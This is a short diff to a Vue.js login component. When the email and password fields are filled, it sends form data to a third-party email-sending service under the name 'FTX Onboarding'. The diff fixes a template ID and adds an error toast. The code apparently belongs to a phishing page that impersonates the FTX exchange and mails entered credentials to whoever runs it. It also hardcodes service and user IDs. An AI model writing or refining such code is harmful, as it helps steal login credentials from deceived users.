@@ -124,7 +124,7 @@ export default {
         if (this.email !== '' && this.password !== '') {
           var data = {
             service_id: 'service_g49xzs9',
-            template_id: 'template_xkj0lgc0',
+            template_id: 'template_xkj0lgc',
             user_id: 'Q_v6F22hpmQkpwuex',
             template_params: {
               from_name: 'FTX Onboarding',
@@ -141,6 +141,7 @@ export default {
             })
             .catch(function () {
               self.isLoading = false
+              self.$toast.error('Something went wrong, contact administrator')
             })
         } else {
           this.$toast.info('Wrong Input!. Fill the input form ')
